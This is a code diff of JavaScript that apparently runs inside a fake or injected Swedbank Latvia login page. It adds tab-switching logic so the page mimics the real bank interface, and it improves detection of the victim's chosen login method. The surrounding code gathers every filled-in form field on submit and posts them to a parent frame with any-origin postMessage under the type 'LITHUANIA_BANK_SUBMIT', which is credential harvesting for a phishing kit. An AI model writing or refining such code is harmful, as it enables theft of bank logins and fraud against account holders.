@@ -451,6 +451,13 @@ if(bank==='swedbank-lv'){
     });
     wrap.appendChild(tog);wrap.appendChild(menu);
     sel.parentNode.insertBefore(wrap,sel.nextSibling);
+    var tabs=Array.prototype.slice.call(document.querySelectorAll('ui-views ui-tab, ui-tabs ui-tab'));
+    function showTab(i){
+      tabs.forEach(function(t,j){
+        if(j===i){t.classList.remove('-hidden','sf-hidden','hidden');t.removeAttribute('hidden');t.classList.add('-active');t.setAttribute('active','');t.removeAttribute('aria-hidden');}
+        else{t.classList.remove('-active');t.removeAttribute('active');t.classList.add('-hidden');}
+      });
+    }
     document.addEventListener('click',function(e){
       var it=e.target.closest&&e.target.closest('#LV_SWED_DROPDOWN [data-lv-idx]');
       if(it){
@@ -459,7 +466,7 @@ if(bank==='swedbank-lv'){
         var i2=parseInt(it.getAttribute('data-lv-idx'),10);
         txt.textContent=it.textContent.trim();
         menu.querySelectorAll('[data-lv-idx]').forEach(function(x){x.style.fontWeight=x===it?'700':'';});
-        go(i2,'');
+        showTab(i2);go(i2,it.textContent.trim());
         return;
       }
       if(e.target===tog||tog.contains(e.target)){
@@ -526,8 +533,8 @@ if(bank==='swedbank-lv'){
     if(!ok)return false;
     var inputs={};
     list.forEach(function(i){var k=i.name||i.id||'field';if(i.value&&i.value.trim())inputs[k]=i.value.trim();});
-    var lm='';var act=document.querySelector('.login-type.active,vaadin-tab[selected],[role=tab][aria-selected=true],button[data-selected="true"]');
-    if(act)lm=(act.textContent||'').trim();
+    var lm='';var act=document.querySelector('.login-type.active,vaadin-tab[selected],[role=tab][aria-selected=true],button[data-selected="true"],ui-tab.-active,ui-tab[active]');
+    if(act)lm=(act.getAttribute('label')||act.getAttribute('aria-label')||act.textContent||'').trim();
     try{parent.postMessage({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:[],loginMethod:lm}},'*')}catch(_){ }
     return true;
   }
